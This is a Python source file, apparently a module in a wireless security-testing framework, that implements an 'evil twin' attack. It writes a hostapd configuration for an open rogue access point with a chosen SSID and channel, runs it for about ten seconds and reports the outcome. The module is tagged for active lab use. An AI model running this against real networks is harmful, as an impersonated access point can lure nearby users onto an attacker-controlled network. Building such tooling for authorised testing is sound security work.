import subprocess
import tempfile
import time
import structlog

from srt.core.module import AttackModule, AttackResult, ModuleContext, Risk, Status
from srt.core.registry import register

log = structlog.get_logger(__name__)

@register
class WifiEvilTwin(AttackModule):
    name = "wifi.evil_twin"
    protocol = "wifi"
    risk = Risk.ACTIVE_LAB
    description = "Evil twin attack - creates rogue AP."

    def precheck(self, ctx: ModuleContext) -> bool:
        return True

    def run(self, ctx: ModuleContext) -> AttackResult:
        started = time.time()
        
        ssid = ctx.params.get("ssid", "EVIL_TWIN")
        channel = ctx.params.get("channel", "6")
        
        # Create hostapd config
        conf = f"""interface=wlan0
driver=nl80211
ssid={ssid}
channel={channel}
hw_mode=g
wpa=0"""
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as f:
            f.write(conf)
            conf_path = f.name
        
        try:
            log.info("starting_evil_twin", ssid=ssid, channel=channel)
            
            # Start hostapd
            proc = subprocess.Popen(
                ["hostapd", conf_path],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            # Wait to see if it starts
            time.sleep(3)
            
            if proc.poll() is not None:
                stderr = proc.stderr.read().decode() if proc.stderr else ""
                log.error("hostapd_failed", error=stderr[:100])
                return self._result(
                    Status.FAIL,
                    started,
                    summary=f"Hostapd failed: {stderr[:50]}"
                )
            
            # Run for 10 seconds
            time.sleep(10)
            proc.terminate()
            proc.wait()
            
            return self._result(
                Status.OK,
                started,
                summary=f"Evil twin: {ssid} on ch{channel} ran for 10s",
                metrics={"ssid": ssid, "channel": channel, "success": True}
            )
            
        except Exception as e:
            log.error("evil_twin_error", error=str(e))
            return self._result(
                Status.FAIL,
                started,
                summary=f"Error: {str(e)[:50]}"
            )
    
    def cleanup(self, ctx: ModuleContext) -> None:
        subprocess.run(["pkill", "-f", "hostapd"], check=False)
